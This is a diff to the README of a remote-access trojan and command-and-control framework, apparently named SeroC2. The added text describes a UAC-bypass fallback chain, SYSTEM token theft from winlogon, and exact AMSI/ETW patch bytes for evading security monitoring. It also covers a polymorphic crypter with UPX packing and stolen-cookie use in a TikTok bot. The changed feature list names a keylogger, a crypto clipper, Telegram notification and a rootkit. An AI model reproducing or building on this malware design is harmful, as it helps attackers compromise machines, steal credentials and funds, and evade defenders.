@@ -320,16 +320,17 @@ The stub copies itself to `%AppData%\Roaming\<PersistName>\<HiddenFileName>`.
 
 The builder generates a **polymorphic native C++ loader** that encrypts and launches the stub in memory.
 
-**UAC Bypass:** computerdefaults → fodhelper → sdclt → mmc automatic fallback chain  
+**UAC Bypass:** SilentCleanup windir-hijack → scheduled task → CMSTP INF → EventVwr → WsReset → Sdclt → ComputerDefaults → Fodhelper — non-registry methods tried first  
 **SYSTEM Elevation:** SeDebugPrivilege → `winlogon.exe` token duplication → `CreateProcessWithTokenW`
 
 **Encryption pipeline:**
 1. **LZNT1** compression via `ntdll!RtlCompressBuffer`
 2. **AES-256-CBC** with random per-build key/IV embedded as RCDATA resource
+3. **SFC64 stream cipher** — resource payload encoding (1:1 ratio, 32-byte random seed per build)
 
 **Polymorphism:** per-build random AES key split across 3 binary locations, random 8-byte magic signature, unique BuildId GUID, random junk function names and shuffled call order.
 
-**AMSI + ETW Bypass:** patches `amsi.dll!AmsiScanBuffer` and `ntdll!EtwEventWrite` with XOR-obfuscated patch bytes.
+**AMSI + ETW Bypass:** ETW patched first (`EtwEventWrite`) then AMSI (`AmsiScanBuffer`) via `NtWriteVirtualMemory`; 4-byte `push 0; pop eax; ret` patch, XOR-obfuscated per build.
 
 ---
 
@@ -416,6 +417,7 @@ Or open `Sero.sln` in Visual Studio 2022 and press `F6`.
 - `cl.exe` (MSVC) missing → run `setup.bat`
 - `vswhere.exe` not found → add `C:\Program Files (x86)\Microsoft Visual Studio\Installer` to PATH
 - NativeAOT requires `win-x64` RID — do not mix in wasm workloads
+- UPX checkbox: place `upx.exe` in PATH or in a `tools/` folder next to `SeroServer.exe`
 
 ---
 
@@ -530,7 +532,7 @@ SeroC2/
 - [x] CPU/RAM telemetry — GetSystemTimes + GlobalMemoryStatusEx sampling every ~15 s, displayed as columns in client list with color-coded brush
 - [x] Reverse SOCKS5 proxy — tunnel traffic through the remote machine, local SOCKS5 listener
 - [x] TikTok Bot — multi-client panel: CDP session detection (navigates to tiktok.com and reads Chrome cookies via `Network.getCookies` — skips signup if session exists), CDP auto-signup via Google OAuth (Chrome hidden, no HVNC), account inventory, comment broadcast with rotation across all accounts; cookie auto-flows from signup to comment panel, post comments on videos and livestreams using an existing session
-- [x] Stub size — **7.91 MB** NativeAOT (all features: + Service Manager, Window Manager, Registry Editor, Installed Apps, Device Manager, TCP Firewall, CPU/RAM telemetry)
+- [x] Stub size — **8.00 MB** NativeAOT / **2.36 MB** with UPX `--best --lzma` (all features incl. Keylogger, Crypto Clipper, Telegram notify)
 - [x] Polymorphic Crypter — AES-256-CBC, LZNT1, AMSI+ETW bypass *(closed-source)*
 - [x] UAC Bypass chain — computerdefaults → fodhelper → sdclt → mmc *(closed-source)*
 - [x] Rootkit — reflective DLL, NtQuerySystemInformation / NtQueryDirectoryFile hooks
